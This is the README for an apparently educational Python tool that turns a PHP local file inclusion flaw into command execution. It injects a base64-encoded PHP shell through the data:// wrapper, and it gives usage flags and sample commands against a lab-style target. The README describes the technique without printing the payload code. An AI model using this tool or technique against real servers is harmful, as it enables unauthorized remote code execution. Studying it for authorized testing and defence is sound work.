# PHP Wrapper Shell (Educational)

This script demonstrates how an LFI vulnerability can be turned into code execution using the `data://` wrapper. It base64-encodes a tiny PHP shell, injects it via a vulnerable GET parameter, and runs commands. Use only on systems you own or are explicitly authorized to test.

## Quick Use

```powershell
python main.py <target> [--param PARAM] [--command CMD | --interactive] [--verbose]
```

## Flags — When to Use Them
- `target` (positional): The vulnerable page. Add `http://` or `https://` if needed (e.g., `http://site.com/page.php` or `94.237.120.233:51510/index.php`).
- `-p, --param` (default `language`): When the vulnerable parameter name is not `language`.
- `-c, --command`: When you want to run one command and exit. Example: `-c "id"`.
- `-i, --interactive`: When you want a prompt (`shell>`) to run multiple commands. Type `exit` to quit.
- `-v, --verbose`: When you want to see the payload, encoded value, and full request URL for learning/debugging.

## Examples
- Interactive session (explore multiple commands):
  ```powershell
  python main.py 94.237.120.233:51510/index.php -i
  ```
- One-off command (quick check):
  ```powershell
  python main.py http://site.com/page.php -c "uname -a"
  ```
- Custom vulnerable parameter name:
  ```powershell
  python main.py http://site.com/page.php -p file -c "id"
  ```

## Educational Focus
- Shows how `data://text/plain;base64,<payload>` can be abused through LFI.
- Demonstrates payload encoding and HTML filtering for clearer output.
- Intended solely for learning and authorized testing.
